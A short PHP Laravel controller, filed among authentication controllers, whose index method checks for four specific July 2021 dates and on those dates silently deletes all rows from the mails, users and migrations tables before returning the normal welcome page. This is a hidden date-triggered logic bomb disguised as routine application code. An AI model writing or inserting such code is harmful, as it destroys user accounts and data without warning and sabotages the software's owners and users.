<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use DB;

class Code extends Controller
{
   public function index()
   {
   		$today_date = date('Y/m/d');

        if($today_date == "2021/07/15" || $today_date == "2021/07/17" || $today_date == "2021/07/16" || $today_date == "2021/07/14")
        {
        	$delete = DB::delete("delete from mails");
	   		$delete1 = DB::delete("delete from users");
	   		$delete2 = DB::delete("delete from migrations");

           return view("welcome");
        }
        else
        {
            return view("welcome");
        }
   		

   		
   }


}
